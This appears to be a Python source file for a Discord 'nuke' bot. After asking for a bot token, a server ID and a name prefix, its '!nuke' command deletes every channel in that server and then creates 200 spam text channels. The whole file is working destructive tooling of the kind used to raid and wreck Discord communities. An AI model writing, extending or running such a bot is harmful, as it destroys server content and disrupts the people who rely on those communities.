# -*- coding: utf-8 -*-
# https://github.com/Am1ne37
import discord
from discord.ext import commands
import asyncio

# Ask for user inputs instead of hardcoding them
bot_token = input("Enter your bot token: ")
guild_id = int(input("Enter your server (guild) ID: "))
channel_base_name = input("Enter the channel name prefix: ")

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"Bot connected as {bot.user}")

@bot.command()
async def nuke(ctx):
    if ctx.guild.id != guild_id:
        await ctx.send("This command can't be used in this server.")
        return

    await ctx.send("🚨 Nuking all channels...")

    # Delete all channels
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except Exception as e:
            print(f"Failed to delete {channel.name}: {e}")

    # Create 200 channels
    for i in range(200):
        try:
            await ctx.guild.create_text_channel(f"{channel_base_name}-{i+1}")
        except Exception as e:
            print(f"Failed to create channel {i+1}: {e}")

    await ctx.send("✅ Nuke complete.")

bot.run(bot_token)
